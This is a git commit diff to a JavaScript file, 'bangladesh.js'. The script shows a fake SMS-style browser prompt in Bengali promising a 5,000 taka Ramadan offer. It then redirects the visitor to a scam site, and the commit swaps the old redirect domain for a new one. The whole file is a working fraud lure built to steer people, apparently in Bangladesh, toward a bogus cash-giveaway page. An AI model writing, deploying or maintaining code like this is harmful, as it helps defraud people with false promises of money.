84c5b905897ee0a1ab1030be0a7930768a6d52f1
newetijazz28 <newetijazz28@gmail.com>
2026-02-06 09:57:38 +0100

    Update bangladesh.js

--- bangladesh.js
+++ bangladesh.js
@@ -1,5 +1,5 @@
 var password = '৫,০০০ টাকা উত্তোলন করুন'
 password=prompt('SMS: অভিনন্দন, আপনাকে ৫,০০০ টাকার রমজান অফার গ্রহণের জন্য আমন্ত্রণ জানানো হচ্ছে।, এই অফারটি পেতে ঠিক আছে টিপুন','৫,০০০ টাকা উত্তোলন করুন');
 if (password != '৫,০০০ টাকা উত্তোলন করুন') {
-location.href='https://www.knerxbz.site/tk5000-ramadan-relief-packages-2026.';
+location.href='https://www.uwemafia.site/tk5000-ramadan-relief-packages-2026.';
 }
